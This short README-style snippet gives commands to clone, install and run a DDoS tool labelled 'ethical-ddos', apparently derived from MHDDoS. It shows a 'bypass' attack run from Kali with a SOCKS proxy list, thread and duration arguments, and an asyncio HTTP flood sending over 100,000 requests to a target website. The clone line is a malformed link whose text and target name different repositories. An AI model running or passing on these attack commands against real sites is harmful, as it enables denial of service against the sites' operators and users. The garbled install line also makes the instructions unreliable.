


**Clone and Install Script**

```shell script
[git clone https://github.com/MatrixTM/MHDDoS.git](https://github.com/gamal-ahmed/ethical-ddos.git)
cd ethical-ddos
pip install -r requirements.txt
```
**To start the attack from Linux-Kali**
The bypass
```shell script
cd ethical-ddos
python3 start.py bypass website 1 101 sockws5.txt 10970 3600 true
```
**Most Effecient to attack from MAC-OS**
```
--debug: for more info and details about the attack
```
```shell script
cd ethical-ddos
python3 asyncio_http.py --urls  website  --total_requests 103002 --debug
```

---

